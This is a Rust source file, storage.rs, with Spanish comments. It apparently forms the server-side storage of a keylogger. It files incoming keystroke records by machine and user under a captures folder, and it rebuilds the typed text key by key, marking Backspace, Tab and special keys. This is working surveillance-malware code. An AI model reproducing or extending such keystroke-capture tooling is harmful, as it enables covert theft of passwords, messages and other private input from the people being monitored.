// storage.rs - VERSIÓN QUE SIEMPRE GUARDA
use std::sync::{Arc, Mutex};
use std::fs::{OpenOptions, create_dir_all};
use std::io::Write;

#[derive(Clone)]
pub struct Storage {
    inner: Arc<Mutex<Vec<serde_json::Value>>>,
}

impl Storage {
    pub fn new() -> Self {
        let _ = create_dir_all("./captures");
        println!("📁 Carpeta captures/ creada");
        Self {
            inner: Arc::new(Mutex::new(Vec::new())),
        }
    }

    pub fn add(&self, data: serde_json::Value) {
        // 1. Guardar en memoria
        let mut store = self.inner.lock().unwrap();
        store.push(data.clone());

        // 2. Guardar en archivo original (con timestamp)
        let _ = self.save_to_file(&data);

        // 3. Guardar en archivo limpio (solo texto, sin timestamps)
        let _ = self.save_clean(&data);
    }

    pub fn get_all(&self) -> Vec<serde_json::Value> {
        let store = self.inner.lock().unwrap();
        store.clone()
    }

    fn save_to_file(&self, data: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
        let key = data["key"].as_str().unwrap_or("?");
        let timestamp = data["timestamp"].as_str().unwrap_or("");
        let machine = data["machine"].as_str().unwrap_or("unknown");
        let user = data["user"].as_str().unwrap_or("unknown");

        let filename = format!("./captures/{}.txt", machine);
        let line = format!("[{}] {}: {}\n", timestamp, user, key);

        let mut file = OpenOptions::new()
            .create(true)
            .append(true)
            .open(&filename)?;
        file.write_all(line.as_bytes())?;

        Ok(())
    }

    // Guardar en archivo limpio - SIEMPRE GUARDA CADA TECLA
    fn save_clean(&self, data: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
        let key = data["key"].as_str().unwrap_or("");
        let machine = data["machine"].as_str().unwrap_or("unknown");

        let clean_filename = format!("./captures/{}.clean.txt", machine);

        // Abrir el archivo en modo append
        let mut file = OpenOptions::new()
            .create(true)
            .append(true)
            .open(&clean_filename)?;

        // Escribir la tecla en el archivo limpio
        match key {
            "Enter" | "\r" => {
                // Enter: salto de línea
                file.write_all(b"\n")?;
            }
            "Space" => {
                file.write_all(b" ")?;
            }
            "Backspace" => {
                // No podemos borrar del archivo, así que lo marcamos
                file.write_all(b"<BACKSPACE>")?;
            }
            "Tab" => {
                file.write_all(b"\t")?;
            }
            "" => {
                // Tecla vacía, ignorar
            }
            _ if key.len() == 1 => {
                // Tecla normal: escribir el carácter
                file.write_all(key.as_bytes())?;
            }
            _ => {
                // Otras teclas especiales (F1, flechas, etc.)
                file.write_all(format!("<{}>", key).as_bytes())?;
            }
        }

        Ok(())
    }
}
